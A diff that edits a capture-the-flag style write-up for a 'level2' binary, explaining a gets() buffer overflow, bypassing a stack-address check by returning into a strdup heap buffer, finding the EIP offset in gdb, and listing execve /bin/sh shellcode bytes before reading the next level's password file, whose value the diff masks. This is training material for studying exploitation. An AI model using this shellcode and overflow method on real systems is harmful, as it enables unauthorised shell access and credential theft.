@@ -22,7 +22,6 @@ a
 
 The program displays the input
 
-
 ## Learning more
 
 ```bash
@@ -82,9 +81,8 @@ End of assembler dump.
 0x08048500 <+44>:	cmp    $0xb0000000,%eax
 ```
 
-Like in level1, we can see a call to gets() function wich is vulnerable to buffer overflow attack.
+Like in level1, we can see a call to gets() function which is vulnerable to buffer overflow attack.
 A check is made to make sure we dont overwrite the return address to an adress on the stack. 
-
 The restriction on our return address appears to be anything that starts with the the bit ‘b’ (indicated by the ‘and’ calculation with the value "0xb0000000").
 Due to this check we couldn't point the return address to the stack (0xbf000000 - 0xbfffffff range). This avoids having a shellcode stored on the stack or in environment variable. But if we can't use the stack we can use the heap !
 
@@ -93,7 +91,7 @@ Due to this check we couldn't point the return address to the stack (0xbf000000 
 ```
 
 We see in the program that the buffer is later copied inside a strdup. 
-This function use malloc which stores the memory in ... the heap.
+This function use malloc which stores the memory on the heap.
 
 
 ```bash
@@ -106,7 +104,7 @@ strdup("")                                      = 0x0804a008
 +++ exited (status 8) +++
 ```
 
-We see that the malloc always returns the address '0x0804a008'
+We see that the malloc returns the address '0x0804a008'
 
 
 ## Getting access to the shell 
@@ -119,16 +117,6 @@ We generate a pettern using [this website](https://wiremask.eu/tools/buffer-over
 
 ```bash
 $ gdb level2
-GNU gdb (Ubuntu/Linaro 7.4-2012.04-0ubuntu2.1) 7.4-2012.04
-Copyright (C) 2012 Free Software Foundation, Inc.
-License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
-This is free software: you are free to change and redistribute it.
-There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
-and "show warranty" for details.
-This GDB was configured as "i686-linux-gnu".
-For bug reporting instructions, please see:
-<http://bugs.launchpad.net/gdb-linaro/>...
-Reading symbols from /home/user/level2/level2...(no debugging symbols found)...done.
 (gdb) run
 Starting program: /home/user/level2/level2 
 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
@@ -140,7 +128,7 @@ eip            0x37634136	0x37634136
 ```
 
 We found that the offset of eip starts at 80.
-Our shellcode will be : 
+Our shellcode will be a classic bin/sh : 
 ```plaintext
 \x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80
 ```
@@ -160,5 +148,5 @@ j
 whoami
 level3
 cat /home/user/level3/.pass
-492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
+***************************************
 ```
